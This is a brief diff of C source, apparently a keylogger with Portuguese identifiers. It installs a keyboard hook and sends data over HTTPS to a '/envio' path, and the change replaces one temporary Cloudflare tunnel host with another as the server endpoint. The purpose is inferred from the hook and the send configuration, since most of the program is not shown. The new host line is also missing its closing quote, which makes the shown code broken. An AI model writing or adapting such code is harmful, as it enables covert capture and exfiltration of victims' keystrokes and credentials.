@@ -16,7 +16,7 @@ void processarFilaPendencias();
 HHOOK hKeyboardHook;
 
 // Configuração do servidor
-#define SERVER_HOST L"https://mutual-hydrocodone-graphics-query.trycloudflare.com "
+#define SERVER_HOST L"https://quotations-tramadol-dealing-strip.trycloudflare.com
 #define SERVER_PORT 443
 #define SERVER_PATH L"/envio"
 #define USE_HTTPS 1
@@ -689,3 +689,4 @@ int main() {
 
     return 0;
 }
+
